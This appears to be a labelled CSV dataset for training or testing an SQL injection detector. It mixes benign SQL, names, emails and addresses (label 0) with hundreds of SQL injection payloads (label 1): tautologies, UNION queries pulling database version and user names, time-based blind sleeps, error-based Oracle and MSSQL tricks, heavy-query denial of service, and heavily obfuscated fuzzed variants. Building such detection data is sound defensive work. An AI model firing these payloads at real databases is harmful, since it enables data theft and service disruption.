Query,Label,cluster,stratify_col
"0o10x0o0b0b1'   )""   )    as omwk<where 0b0b10115588110 .=  0x7b0x0x33550f6  and   char~ (  0x0o116  )`  or char  (! 2x6a  ) <||char  (  (select (select (select (select (select (select 0x75))))))  )  ~|| char  ()(select 0o0b0b0b11110110100110110101)  )   =like  regexp_substring	 (. repeat  ( }right  (  char/*(select 8x0)[uzt0o7>%6zta)jlhc<z[ or false#vw	*/ (  (select 0x26fd), )  ,0x0o0o7< ) =,9b8x11a05f200  )  ,null  )  or 0b1100110100101=(select	(select (select (select (select (select 0x15a9)))))) or '<'='<7' or ')i'=')ii'  or_ false && 0x6 or;"")"" not =%"")"" and ""d"" not like ""dy"" and true`or (select (select (select (select (select (select (select (select (select 2424)))))))))Ã¢Â  not(like  (select 0x978) and (select (select 0x1)) and 0x1 --:`",1,2,1_2
select * from save where    not hidden = 'root',0,5,0_5
from  ( select distinct magnet from stone ) ,0,7,0_7
jed,0,8,0_8
0o0o0b1'+[(: select;'zjvx'where 0x0o0o247b-	=  0b1001091001011*and>0o0b0b110010070100001]like /*ll@f*=(select (select 1))*p	&(select 9)!(select (select (select 3)))bsg*/ (  select}0o15472 from>pg_sleep[_(  (select;5) : )    ) < ` )  +',1,9,1_9
select top 50 percent * from instrument select * from news fetch first 50 percent rows onlyselect top 3 * from electric,0,5,0_5
"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,4,1_4
2isp3n?3io43,0,0,0_0
7050000000000000,0,3,0_3
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1,6,1_6
1  )   or0o15216  =    (  select (select(select (select 0x1a89)))}from pg_sleep :(  (select (select 0x5))   )  ;)`< <and   ( )0b1101101150111 = 7015,1,4,1_4
"'      and      1  =	convert(int,@@version) /*!*/and 1=1--",1,6,1_6
"select < (  case}when/*udnct)*/  (  (select 0o0xa79)  like  0b0b1001111011110! )   then+(select 0xe0b111101) else (select 0b111005910111)*  (  select and*""l""  not= ""ln"" or	false or false#0x0b1010110711 from information_schema.character_sets  )   end ); #nze12*",1,4,1_4
benchley@11horas.fk,0,0,0_0
' and 1=1 -- --1df2z9ma,1,6,1_6
delete from pan where halfway = 'range',0,5,0_5
select avg ( price ) from thus,0,1,0_1
reig jallo,0,8,0_8
"5'  or    ( ;select 'ejuu' from?dual where (select 2b101101910712)\= (select (select (select 0o0x1327)))% &&  (select](select 8b0o2xe7b)) like  (+ select?count	 (. *  )& 	from sysibm.systables as(t1,sysibm.systables as t9,sysibm.systables
ast3+  ) ? ~)+ 	 or '",1,9,1_9
"  select time_to_sec ( ""03:30:00.999999"" ) ;",0,0,0_0
"1'    or    if(substring(database(),    1,    1) =  'a',    sleep(5),    0)    --",1,9,1_9
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  5   )    )    and 'i'  =  'i",1,4,1_4
"calle membezar 0, 2?c",0,0,0_0
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,5,1_5
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1,4,1_4
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- ofqd",1,4,1_4
test' xor '1'='1' /* && 'a'='a',1,9,1_9
"insert into usually ( living, everything, story, opinion, tape, scientific )  values  ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )  ",0,1,0_1
saya,0,8,0_8
admin'   or   '1'  =	'1 -- random_noise,1,9,1_9
waitfor/**/delay/**/%u00270:0:5%u0027/**/or/**/%u0027b%u0027%u0020= %u0027b%u0027--,1,2,1_2
4ode5ista,0,3,0_3
select rose ( s from glass right join,0,7,0_7
oruna,0,8,0_8
"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"1) union select 1,database(),3--",1,4,1_4
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",1,4,1_4
"2x0x9x0o0b0b7""^([),$(%)(,*}or*0?or false#as{jucs/*g()htwi.xjo(\iv<j^`9m*/where
0x4o0x0b0b1x9ab9=0x1o15264",1,2,1_2
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,5,1_5
"1'/**/and/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/--",1,9,1_9
"  select suddenly,chair,escape from chosen left join orders on potatoes.establishid =  steep.people order by beat.flow",0,1,0_1
"-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",1,6,1_6
mandayona,0,8,0_8
"1))/*!*/union					select					1,database(),3--",1,4,1_4
renny,0,8,0_8
test'/*!*/or '1'>='1' /* and 'a'='a',1,9,1_9
select   (  case when   (  6969  =  5797  )   then 6969 else 6969*  (  select 6969 from information_schema.character_sets  )   end  )  #,1,4,1_4
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,4,1_4
"'/**/and/**/1=convert(int,@@version) or (1)--",1,0,1_0
"1'+& (  select""'vidl' where (select/**/9445)* like; 9445`and/0b10000100110010:
=.$0b0b0b1011010010001+and 0b1/**/or}false#c~",1,2,1_2
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1,9,1_9
"1'  and  row  (  0x785d,(select (select	7x1d2d))  )  >  (~ select count  ( * .)  ,concat= (  9x3b19011510110111801111010a0o107,  (  select   (  elt  ([ 0x185d )like  0x185d,0o0x8$  )    )     )\',0b0x0o1385a0o1422a71,flo or;  (  r &&   ( %0o0/*if-i\*/!); *(select (select 0x0o0))   )!   )   x from : (  select (select (select (select[5192)))
union select (select 3715) union select (select 0xe2f) union select 0x1bf6  ) |a group	by x  )   ;  and    'eovg' like{'eovg",1,9,1_9
"0b1'	where?5o0x1010

likeÃ¢Â (4115",1,2,1_2
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj,1,9,1_9
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cxor'  =  'cxor",1,9,1_9
incisivo,0,8,0_8
quest@palmatraducciones.pw,0,0,0_0
1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,4,1_4
santaren,0,8,0_8
select * from noise order by president desc,0,7,0_7
test'/**/or/**/'1'	=	'1'/**/--/**/,1,9,1_9
"1""  )   as vqkz where 8536  =  8536",1,6,1_6
"-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--",1,6,1_6
select * from seven where put between 'constantly' and 'effort',0,5,0_5
"1' and substring(database(), 1, 1) = 's' ----gqyls",1,9,1_9
2946,0,3,0_3
select * from least 3 select * from love,0,5,0_5
"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",1,4,1_4
"0x1 % )? .])  ; and (select$7x0b110111bc)? like ;   (/*f*/select count  ( !*  )   from all_users>t4,all_users t0o11,all_users t0o3,all_users t0x0x3,all_usersÃ¢Â t0  ) ]&& true  or  false  and  true or false or>false and true and (select 1)#and&(select (select (select (select 0x1)))) --",1,2,1_2
"1' ;)
  as`rvch where 0x115 <like?(select 0x0o0b0o0b2017181016)  or (select/*zplj */2x0o20c9)  like  like[{(  'abcdefg',upper  (  hex |(, randomblob {(  7o0x1f9o2696145/(select 0x2)_ {)    )![;_  )  ` ) :+or 'a' not like<'a') or  false and true  or  false  or?Ãºlse or'7x0 &&!true andÃ¢Â "";r\~"" not like'"";r\~l""andtrue  &&  true or (select (select^5x0)) and`true~--",1,2,1_2
select * from fifteen where stopped = 'rising' limit 3,0,5,0_5
"1'+_ (  select 'nmhy'
whereÃ¢Â 0b1x1o0o0b0o0x0b1101cee0o6526b5:$like  0xb0o0x0b0x0o111?and:(selectÃ¢Â (select 0b0b1111110110111))  like 
Ã¢Â  (  select;count  (!`c'w(select (select 0x0))*>{)	  from sysibm.systables as t0b0b1,sysibm.systables]as t2,sysibm.systables as t0o3|%)  andÃ¢Â 0b0b8110110111010 in ((select (select (select (select (select 0b1110110111001))))),(select 0x1xa32),(select (select 0o0x1dbb)))%and 3b10000010021020 like (select (select 0x209b)) or ""v|p""!not like?""v|p"" or@""y""  not  like*  ""y""   or   false or false||(select (select (select (select 0))))   &&
  true --",1,4,1_4
rocco-misaki@soybueno.nz,0,0,0_0
con10e4t2,0,8,0_8
select * from creature where game = 'hurried'  or camp = 'rapidly',0,5,0_5
"3o9'<`)>~)
,!,as_qqvk
where&(select_0b7x3ef)=1501",1,2,1_2
6105,0,3,0_3
"1))union/*
*/select1,database(),3--",1,0,1_0
" select.*{from users where id=(select 7):or $<\.^union select (select (select 1)),@@version or false!or false and 0b1 --	0x0b1",1,4,1_4
select eager,0,7,0_7
michalowski@lodgeinmadrid.mu,0,0,0_0
ayate,0,8,0_8
"   select joined, boat+ ', ' + its+ ' ' + label+ ', ' + broken as club  from joy",0,5,0_5
4.46813e+015,0,3,0_3
"1) union select 1,database(),3--",1,4,1_4
select * from board  where eleven = expression,0,5,0_5
"1)union
select/*
*/1,database(),3--/*
*/",1,0,1_0
select * from like 3,0,5,0_5
"1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1,9,1_9
select * from walk where son = 'failed'  and city = 'hold',0,5,0_5
"1%'   )    )     )   union all select null,null,null,null--",1,4,1_4
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ibrj'  =  'ibrj",1,9,1_9
-9264'  )   or 8571  =  8571--,1,6,1_6
select min ( spirit )  as plastic from expect,0,1,0_1
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1_1
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""bvdv"" like ""bvdv",1,1,1_1
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,4,1_4
"1%""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,1,4,1_4
select * from north order by use desc,0,7,0_7
" select * fromuserswhere id  =< (select 1)^or ""  )  ,""	or7x0b0b0o4 \=  (select (select (select 6o1)))andtrue -- (select 1)?",1,4,1_4
 (  8266  =  8266  )  *9900,1,6,1_6
"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""zgoy"" like ""zgoy",1,4,1_4
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1,6,1_6
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",1,4,1_4
"/**/selectÃ¢Â * from users where}id  =Ã¢Â  '6'   union|select null,banner from v$version where rownum  like  (select (select 1)) or false --}1'^?",1,2,1_2
""" or ""x""  =  ""x",1,2,1_2
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,1,4,1_4
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,0,1_0
"1'unionselecttable_name,null,/*
*/nullfrominformation_schema.tables -- random_noise--",1,0,1_0
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,5,1_5
0b0o0b111b4'(or^$;(/*|zh`qg>*/select/*!>a3\y;(select.(select0x1))*/'qstz'[where.0x5b0x6ab3%=_5565,1,2,1_2
"0b0 or 
 (_ select * from  ( +select (""-sleep  (  0o0b0b0o125   )   }) ?   ) )ydpu~ )   and (select 0x1) and true or ""s"" not like ""s"" and (select (select (select (select 8785))))<>(select 8786) or ""o""=""o5""# lwfsd[l",1,4,1_4
"%u0027%u0020and%u00201>=convert(int,@@version)--#3mx6wn44m1og",1,2,1_2
"4x0x5x6b6b6o9\.	)~` /)<`_ union
all/select_null,null,null,null,null,null,null,null,null,null	or:false && true&and (select (select-(select (select 0x30c))))}not =~0b1x7d2&&true or*(select (select (select (select 0x1c7))))	not like=(select*0b110110011)/or false  or}	false or false#@aca
k4",1,4,1_4
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",1,4,1_4
"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",1,6,1_6
"test'or/*
*/'1'='1'--/*
*/",1,9,1_9
"0o2%""/*""si$/p0o5`g6j=*/ )  -and~(select 0b0b1110101101101010110110100011100101110010)+/**/=	/**/3xe0b0x2a  or  falseor
(select0x1be3) not like (select^(select 0x1bd2)) or ""4"" not like ""3""/**/or false`or false#j",1,2,1_2
"0o71b0x0b0o0b0o5o0x3e9'+  or { $(*?select!'jbgg'_from<dual(where(select (select 0x0b111c0)) <=
|0b11x0o7c2&union	all]or&false  or  false or false	and&true  or  false    &&    (select 8355) not like=0x20a4?or (select (select 3255)) not;like (select 0xbef)]or false#select""null,null,null,null,null,null,null,null,null,null#d""&qwjuhjbuud`n}o",1,4,1_4
select * from breeze fetch first 3 rows only,0,0,0_0
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1,4,1_4
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,4,1_4
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",1,9,1_9
admin' or '1'='1,1,9,1_9
8708,0,3,0_3
"select.sleep_*( )0b111o5x4o4o0o0b0o0b0b0b1111112918 [)!    &&     _(   *(Ã¢Â ))""vzye"" /*3:gx?f*/like 	""vzye",1,2,1_2
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,4,1_4
select count ( distinct does )  from hand,0,1,0_1
"1' && substring(database(), 1, 1) = 's' --",1,9,1_9
"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1,4,1_4
"   select employees.fact, count ( orders.studyingid )  as ponyfrom    ( ordersinner join studied on orders.resultid  =  employees.vastid ) ",0,1,0_1
"
select * from users where id like  (select (select 1))?*$. union select null,@@version and ""5s"" like ""0x5s""  )or \](select (select 7))
--Ã¢Â 0b0b1",1,4,1_4
'     and     1	=	1     --     ,1,6,1_6
select count ( worthid ) from mirror,0,1,0_1
"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",1,4,1_4
"0x1' where 0x0x0b1071100a  like  (select (select (select (select 0x728)))) or	char` (; 0o1x0xb3  )&/*|lb(oc%vi*/ or	char& (  0x64= )    or  char  ({)0b111011 <) \ or char> ( 	0o371  ) 	  like  regexp_substring 	(  repeat  && true and true&&(select (select (select 1))) or false or false or false and 1 or false#(]~right  (  char /*	|5_u*/(  (select (select (select (select (select (select (select 0x4a1)))))))  )  ,(select""0x0)  )  ,0b0x3x0x99bf0o1604 ) ,null/ )   or: 0x1949 not/**/like 0o10531 and (select (select 0b0x20fb)) not like (select!0x4034)\--	1ze+#ak",1,4,1_4
select slipped ( s )  from dawn left join,0,1,0_1
"calle hemingway, s/n",0,0,0_0
hartzenbusch 98,0,0,0_0
"-4586 union all select 2068,2068,2068,2068--",1,4,1_4
"   select count ( pick ) , rope from final by mistake",0,1,0_1
select * from mirror  where cost = fire,0,5,0_5
select * from hurry where scientific between '1996-07-01' and '1996-07-31',0,5,0_5
1'   )    )    as iuta where 1482  =  1482,1,6,1_6
select * from circle where getting between white09/01/1996next and during15/31/1996came,0,5,0_5
1133130000000000,0,3,0_3
select count ( simplestid ) from here,0,1,0_1
"0o4x7x7x0%'$	)] % )    union all@select:null  &&  true and[true or false or (select 0o0o0) or false and true#}bnh:
(select 2)@",1,2,1_2
"1' where	0xe0x9c$=/*;m)}lg}a^sfjf*/0xe1c and 	 (  select~3x536b from  ( \select count /**/(  *  )  ,concat  (  0x7171706a70,  (  select   (  elt  (  (select 0x234b)=(select (select 0x0xecb)),0x6! )
   )    !)  ,0x0o1315a0x2ffa71,floor 	(| rand  (  (select (select (select (select 0))))  )+ *0x2)  )  , )  ~x from inf or=mation_schema.character_sets group by x !) ;a  )      ~&&      true or (select 0x6)  or  false and true and 'hd' not like 'hdj' or (select (select (select (select (select 0))))) --",1,4,1_4
-2233' or   (  1807  =  7274  )  *7274,1,6,1_6
68318279e,0,3,0_3
"  select richid as id, influence as rear from now",0,7,0_7
"~select * from userswhere{id<= '9' union select   (  8x0o0  ) -,banner from v$version where{rownum  =  7x0o0o1&or false and true	 or	 (select`(select (select 0x0)))#and true or 'uezl'='uezlv' --/1'",1,4,1_4
select top 50 percent * from across select * from agree fetch first 50 percent rows onlyselect top 3 * from per,0,5,0_5
51975226x,0,3,0_3
select * from thy fetch first 50 percent rows only,0,0,0_0
select * from church where captured not between 'invented' and 'fifty',0,5,0_5
villasequilla,0,8,0_8
select * from tone where mathematics between '1996-07-01' and '1996-07-31',0,5,0_5
declare @qnvarchar   ( 0xc8! )   select!@q  ={ 0b0x770061006900740066006f0072002000440065006c0b1000010001001010001100000000111111101101101110111010111111010010111101a0030003a0031003000270000 exec  (/**/ @q  )?,1,0,1_0
"0o0b0b1"" where (select 0x0b1110d5)   like   0b7b1150010100101?and	char; (  (select (select 109)). ) &or char ;(  (select/0b0b0x57)
 )   *or  char	(  and ""m"" != ""m0"" or false  or ^false and (select (select (select (select 6100)))) not like (select 0x1771) and true  or  false and*(select (select (select 6))) and 0x2 or 0x4 or
(select 1987)not like 1987 and true or (select 0) and true and true or false and true and (select 1)#(select 0x12)? )	@||char  (.#5o0x5a ) -=+regexp_substring  (, repeat /(  right  (  char-=(? 0o0b1011001401000 "")  ,0x0o0  )  ,(select (select 5010202900))  )] ,null !)  --aetmkn_d;v]wj5c",1,4,1_4
"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
"0x0'   )    )     )   rlike  (% select * from  
(  select  (  sleep  (  (select (select (select (select (select (select (select (select 0))))))))   )    ) ?  )  sgvo  )  _and    (  "" (     (  'wuux'='wuux",1,9,1_9
97,0,3,0_3
select * from production fetch first 50 percent rows only,0,0,0_0
 (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,1,4,1_4
select desert ( s )  from molecular select hour ( s ) ,0,1,0_1
select fox from first union select breakfast from mouse order by silk,0,7,0_7
or 'text' > 't',1,0,1_0
"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,4,1_4
"8'  or    (  select 'xqqp' where 9o5xbbf  =  0xbbf_and   (. select * from   (  select  (  sleep  (  0x6 [ )    )  Ã¢Â   )  gcrr  )   or '+$9' not like '+$2'   and   (select (select (select 0o4))) and (select (select 887))<>(select (select 0xbb)) or false and true#ucxf",1,4,1_4
select * from nothing fetch first 50 percent rows onlyselect top 3 * from club,0,0,0_0
"1' or ascii(substring(database(), 1, 1)) > 100 --#40o4dcc85p54",1,0,1_0
'/**//**/or/**//**/exists(select/**//**/1/**//**/from/**//**/users)--#81y7xyx66,1,0,1_0
